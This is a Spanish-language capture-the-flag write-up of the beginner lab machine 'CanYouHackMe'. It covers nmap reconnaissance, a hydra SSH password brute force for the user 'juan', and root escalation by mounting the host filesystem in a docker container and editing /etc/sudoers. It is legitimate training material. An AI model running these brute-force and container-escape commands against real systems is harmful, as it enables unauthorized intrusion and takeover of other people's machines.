# CANYOUHACKME - THE HACKERS LABAS

## INFORMACIÓN Y DESPLIEGUE DE LA MÁQUINA

Esta máquina es de [TheHackersLabs](https://thehackerslabs.com/). 

Para descargarla vas a [CanYouHackMe](https://thehackerslabs.com/canyouhackme/) y le das a descargar. Luego importas el .ova para crear la máquina virtual y la arrancas.

### descripción

- Dificultad: principiante
- Sistema Operativo: linux
- Autor: Enaitz

## ESQUEMA

![canyouhackme](https://github.com/user-attachments/assets/7317565f-ae11-46a9-a8cd-a066d9f6d0c0)

## RECONOCIMIENTO DE RED

### conectividad y SO

Primero comprobamos la conectividad con la máquina:

```python
ping -c 1 192.168.1.42
```

![image](https://github.com/user-attachments/assets/a9d8cbd5-fe9e-439d-995a-51d7fa81ca9b)

Nos llega respuesta, y como el TTL es 64, el sistema operativo muy posiblemente sea Linux.

### puertos y servicios

Hacemos un escaneo de todo el rango de puertos por TCP con nmap:

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.42 -oG tcp_ports
```

> `-p-`: todo el rango de puertos

> `--open`: solo reportar los puertos abiertos

> `-sS`: usar el método de escaneo SYN, que es más sigiloso y rápido que el normal. Requiere privilegios a nivel de sistema para enviar raw packets

> `--min-rate 5000` enviar como mínimo 5000 paquetes por segundo

> `-vvv` triple verbose. Nada más descubrir un puerto lo muestra por pantalla, también muestra más información de lo normal sobre el escaneo

> `-n` no hacer resolución DNS

> `-Pn` no hacer host discovery

> `-oG tcp_ports` exportar el output en formato grepeable al archivo `tcp_ports`

![image](https://github.com/user-attachments/assets/8d69c473-aca4-473d-9fe1-61a9c0a1ca0a)

#### puertos abiertos

**22 - TCP - SSH**

**80 - TCP - HTTP**

Ahora sobre estos dos puertos hacemos otro escaneo de versiones y servicios con nmap:

```python
nmap -p22,80 -sCV 192.168.1.42 -oN targeted
```

> `-p22,80` hacer el escaneo solo sobre estos dos puertos

> `-sCV` lanzar escaneo de versiones y scripts estándar de reconocimiento

> `-oN targeted` exportar el output al archivo `targeted`, en formato nmap

![image](https://github.com/user-attachments/assets/8d793561-8c5b-4f18-9a5f-b58a34b6ebee)

## RECONOCIMIENTO WEB

Al cargar el servicio web vemos que no lo resuelve:

![image](https://github.com/user-attachments/assets/2e506392-a43b-4735-82ba-f52266e38827)

Vemos que se nos redirecciona al dominio canyouhackme.thl, así que añadimos la línea `<ip> canyouhackme.thl` al `/etc/hosts` para que podamos resolver el dominio. Después de hacer esto volvemos a cargar la web:

![image](https://github.com/user-attachments/assets/251637ca-be7a-4e39-a9e4-ed89f1bb1157)

No vemos nada útil. Si inspeccionamos el códgio HTML veremos algo muy interesante:

![image](https://github.com/user-attachments/assets/78c617d6-42e1-4cbd-b038-0f30c6966760)

## INTRUSIÓN

Puede que exista un usuario en la máquina llamado juan. Como la máquina tiene el puerto 22 abierto, hacemos fuerza bruta de contraseñas con `hydra`:

```python
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.42
```

![image](https://github.com/user-attachments/assets/298b5d66-ec6a-46a5-bdfd-f74d2acccab0)

Vemos que encuentra una contraseña. Ahora nos conectamos por SSH haciendo `ssh juan@192.168.1.42` y de contraseña "matrix".

## ESCALADA DE PRIVILEGIOS

#### root

Siendo el usuario juan, si hacemos `id`:

![image](https://github.com/user-attachments/assets/82e760e9-7d64-4caa-9c4e-6d9d0d6be997)

Vemos que estamos en el grupo docker. Esto es crítico ya que podemos crear contenedores. Se podría crear un contenedor que monte la raíz del sistema dentro del contenedor, y dentro del contenedor ser root y modificar lo que queramos de la raíz del sistema y los cambios se aplicarían a toda la partición.

Para hacer esto primero descargamos una imagen de ubuntu, por ejemplo:

```python
docker pull ubuntu:latest
```

Después creamos un contenedor con ubuntu que monte la raíz del sistema en `/mnt/root`, por ejemplo:

```python
docker run -dit -v /:/mnt/root --name pwned ubuntu:latest
```

Y después ejecutamos una bash como root dentro del contenedor:

```python
docker exec -it pwned bash
```

Una vez dentro, podemos editar el archivo `/mnt/root/etc/sudoers` y añadir esta línea:

```python
juan    ALL=(ALL:ALL) ALL
```

De esta forma podremos ejecutar comandos como el usuario que queramos siendo juan. Hay un problema y es que nano no está instalado, pero como dentro del contendor somos root simplemente ejecutamos `apt update` y `apt install nano -y`. Una vez instalado, añadimos esa línea al archivo `/mnt/root/etc/sudoers`, guardamos y salimos del contenedor.

Ahora si hacemos `sudo -l` vemos que se han aplicado los cambios:

![image](https://github.com/user-attachments/assets/a146c996-172b-4e33-adce-4b2ac39e3b97)

Así que hacemos `sudo bash` y ganamos una bash como root:

![image](https://github.com/user-attachments/assets/92fc9ea3-7e6d-4f7e-9384-7ca39443267b)